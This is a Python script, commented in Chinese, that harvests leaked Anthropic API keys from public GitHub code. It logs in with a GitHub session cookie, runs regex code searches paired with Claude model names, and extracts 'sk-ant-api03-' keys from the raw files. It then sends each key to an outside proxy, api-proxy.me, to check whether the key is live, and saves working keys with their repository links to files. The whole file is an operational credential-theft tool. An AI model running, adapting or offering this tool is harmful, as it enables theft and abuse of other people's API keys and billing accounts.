#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描sk-ant-api03-开头的Anthropic API密钥的并发扫描器
支持多线程并发搜索以提高扫描速度
现在使用 GITHUB_SESSION 进行搜索，支持正则表达式
"""

import os
import re
import time
import threading
import concurrent.futures
import requests
from queue import Queue
from datetime import datetime
import random

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1    # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
live_keys_queue = Queue()
processed_keys = set()  # 防止重复处理相同密钥
lock = threading.Lock()

# --- GitHub Session Search 相关函数 ---

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                break
                
            # 提取链接
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)


# --- Anthropic密钥验证函数 ---

def check_anthropic_key(key):
    """验证Anthropic API密钥是否有效"""
    if not key.startswith("sk-ant-api03-"):
        return "无效格式"
    
    try:
        headers = {
            'Authorization': f'Bearer {key}',
            'Content-Type': 'application/json'
        }
        
        # 使用指定的模型进行测活
        payload = {
            "model": "claude-3-5-haiku-20241022",
            "max_tokens": 1,
            "messages": [
                {"role": "user", "content": "Hi"}
            ]
        }
        
        # 使用 api-proxy.me 进行验证
        response = requests.post(
            'https://api-proxy.me/anthropic/v1/chat/completions',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        if response.status_code == 200:
            return "🟢 存活 (Live)"
        elif response.status_code == 401:
            return "🔴 无效/已吊销 (Invalid/Revoked)"
        elif response.status_code == 402:
            return "🟡 存活但余额不足 (Live but Insufficient Credits)"
        elif response.status_code == 429:
            return "🟡 存活但超出配额 (Live but Rate-Limited)"
        elif response.status_code == 403:
            return "🟡 存活但权限不足 (Live but Permission Denied)"
        elif response.status_code == 400:
            return "🟡 疑似存活 (Live but Bad Request)"
        else:
            return f"⚪ 未知状态 (Unknown Status): HTTP {response.status_code}"
            
    except Exception as e:
        return f"⚪ 未知错误 (Unknown Error): {str(e)}"

def process_content_file(file_url, worker_id):
    """下载并处理单个文件内容，提取并验证API密钥"""
    try:
        print(f"[Worker-{worker_id}] 正在检查: {file_url}")
        
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        file_content = resp.text
        
        # 使用正则表达式提取sk-ant-api03-密钥
        pattern = r'(sk-ant-api03-[A-Za-z0-9_-]{20,})'
        potential_keys = re.findall(pattern, file_content)
        
        for key in potential_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            # 验证密钥
            status = check_anthropic_key(key)
            print(f"[Worker-{worker_id}] 🔑 发现密钥: {key[:25]}... | 状态: {status}")
            
            # 如果密钥存活，保存
            if "🟢 存活" in status or ("🟡" in status and "Live" in status):
                repo_match = re.search(r'github\.com/([^/]+/[^/]+)', file_url)
                repo_name = repo_match.group(1) if repo_match else "unknown"

                key_info = {
                    'type': 'Anthropic API Key',
                    'key': key,
                    'status': status,
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                live_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已记录存活密钥")
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 处理文件时出错: {e}")

def concurrent_search_and_validate():
    """并发搜索和验证sk-ant-api03-密钥"""
    print(f"🚀 开始并发搜索sk-ant-api03-密钥 (并发数: {MAX_WORKERS})")
    print("=" * 60)
    
    # 定义搜索查询
    search_queries = [
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-haiku-4-5-20251001',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-sonnet-4-5-20250929',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-sonnet-4-20250514',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-opus-4-20250514',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-7-sonnet-20250219',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-5-sonnet-20241022',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-5-haiku-20241022',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-5-sonnet-20240620',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-opus-20240229',
        '/sk-ant-api03-[a-zA-Z0-9_-]{50,100}/ claude-3-haiku-20240307'
    ]
    
    all_file_urls = set()
    
    # 收集所有搜索结果
    for query in search_queries:
        print(f"📡 执行搜索查询: {query}")
        urls = search_github(query, max_pages=5)
        all_file_urls.update(urls)
        # 避免太过频繁
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 使用线程池并发处理文件
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            futures = [executor.submit(process_content_file, url, i % MAX_WORKERS + 1) for i, url in enumerate(file_list)]
            
            # 等待所有任务完成
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                try:
                    future.result()
                    print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                except Exception as e:
                    print(f"❌ 任务异常: {e}")
    
    print("\n✅ 所有文件处理完成")

def save_results():
    """保存扫描结果到文件"""
    live_keys = []
    
    # 从队列中获取所有结果
    while not live_keys_queue.empty():
        live_keys.append(live_keys_queue.get())
    
    if live_keys:
        filename = f'anthropic_live_keys_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=== sk-ant-api03- Anthropic API密钥扫描结果 ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"并发线程数: {MAX_WORKERS}\n")
            f.write(f"发现存活密钥数量: {len(live_keys)}\n")
            f.write("=" * 60 + "\n\n")
            
            for i, key_info in enumerate(live_keys, 1):
                f.write(f"{i}. {key_info['type']}\n")
                f.write(f"   密钥: {key_info['key']}\n")
                f.write(f"   状态: {key_info['status']}\n")
                f.write(f"   仓库: {key_info['repo']}\n")
                f.write(f"   文件: {key_info['file_path']}\n")
                f.write(f"   链接: {key_info['url']}\n")
                f.write(f"   发现时间: {key_info['discovered_time']}\n")
                f.write(f"   处理线程: Worker-{key_info['worker_id']}\n")
                f.write("-" * 60 + "\n")
        
        print(f"\n💾 已将 {len(live_keys)} 个存活密钥保存到: {filename}")
        
        # 同时更新通用的live_keys.txt文件
        with open('live_keys.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n=== sk-ant-api03-密钥扫描结果 (并发扫描) ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n")
            for key_info in live_keys:
                f.write(f"密钥: {key_info['key']}\n")
                f.write(f"状态: {key_info['status']}\n")
                f.write(f"仓库: {key_info['repo']}\n")
                f.write(f"链接: {key_info['url']}\n")
                f.write("-" * 30 + "\n")
        
        print(f"📝 同时追加结果到 live_keys.txt")
    else:
        print("\n📝 未发现存活的sk-ant-api03-密钥")

def main():
    """主函数"""
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION 以使用 Session 搜索模式")
        return

    print("🔍 sk-ant-api03- Anthropic API密钥并发扫描器 (Session Search Mode)")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - API请求延迟: {API_DELAY}秒")
    print(f"   - 每个查询最大结果数: {MAX_RESULTS_PER_QUERY}")
    print(f"   - 测活API: https://api-proxy.me/anthropic/v1/chat/completions")
    print(f"   - 测试模型: claude-3-5-haiku-20241022")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        print("\n🚀 开始扫描...")
        
        # 执行并发搜索和验证
        concurrent_search_and_validate()
        
        # 保存结果
        save_results()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {elapsed_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"✅ 发现存活密钥数: {live_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
        save_results()  # 保存已找到的结果
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")
        save_results()  # 保存已找到的结果

if __name__ == '__main__':
    main()
